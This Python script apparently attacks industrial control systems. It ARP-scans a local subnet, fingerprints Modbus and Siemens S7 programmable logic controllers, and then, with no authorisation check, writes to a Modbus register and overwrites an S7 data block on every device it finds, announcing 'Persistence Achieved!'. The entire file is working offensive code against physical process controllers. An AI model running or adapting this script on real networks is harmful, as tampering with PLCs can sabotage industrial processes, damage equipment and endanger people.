from scapy.all import ARP, Ether, srp
from pyModbusTCP.client import ModbusClient
import snap7
import time

# Constants
SUBNET = "192.168.1.0/24"  # Adjust this based on the network structure
TCP_PORTS = [502, 102]  # 502 for Modbus, 102 for Siemens S7Comm

# ---------------------- STEP 1: DISCOVER PLC IP ----------------------
def discover_plcs():
    found_devices = []
    
    print(f"[*] Scanning Network {SUBNET} for PLCs...")
    arp_request = ARP(pdst=SUBNET)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered_list = srp(broadcast / arp_request, timeout=2, verbose=False)[0]

    for element in answered_list:
        device_ip = element[1].psrc
        found_devices.append(device_ip)

    return found_devices

# ---------------------- STEP 2: CHECK PLC TYPE ----------------------
def identify_plc(ip):
    print(f"[+] Checking if {ip} is a Modbus or Siemens S7 PLC...")

    # Check for Modbus (Port 502)
    modbus_client = ModbusClient(host=ip, port=502, auto_open=True)
    if modbus_client.open():
        print(f"[+] {ip} appears to be a Modbus-compatible PLC.")
        return "Modbus"
    
    # Check for Siemens S7 (Port 102)
    s7_client = snap7.client.Client()
    try:
        s7_client.connect(ip, 0, 1)  # Rack=0, Slot=1 typical for Siemens
        print(f"[+] {ip} appears to be a Siemens S7 PLC.")
        return "Siemens"
    except:
        pass

    return None

# ---------------------- STEP 3: MODIFY PLC PROGRAM ----------------------
def modify_modbus_plc(ip):
    modbus_client = ModbusClient(host=ip, port=502, auto_open=True)

    if modbus_client.open():
        print("[*] Connected to Modbus PLC, attempting to modify control settings...")
        modbus_client.write_single_register(0, 1)  # Example: Changing a control bit
        print("[+] Modified Modbus PLC register (Persistence Achieved!)")
    else:
        print("[-] Failed to connect to Modbus PLC.")

def modify_siemens_plc(ip):
    s7_client = snap7.client.Client()
    s7_client.connect(ip, 0, 1)

    if s7_client.get_connected():
        print("[*] Connected to Siemens PLC, attempting program modification...")
        
        # Example modification: Write new logic to DB1
        db_number = 1
        new_data = bytearray([0x01, 0x02, 0x03, 0x04])  # Example payload
        s7_client.db_write(db_number, 0, new_data)
        
        print(f"[+] Modified Siemens S7 PLC DataBlock {db_number} (Persistence Achieved!)")
        s7_client.disconnect()

# ---------------------- MAIN EXECUTION ----------------------
def main():
    plcs = discover_plcs()

    if not plcs:
        print("[-] No PLCs found on the network!")
        return

    for plc_ip in plcs:
        plc_type = identify_plc(plc_ip)

        if plc_type == "Modbus":
            modify_modbus_plc(plc_ip)
        elif plc_type == "Siemens":
            modify_siemens_plc(plc_ip)
        else:
            print(f"[-] PLC at {plc_ip} not recognized.")

if __name__ == "__main__":
    main()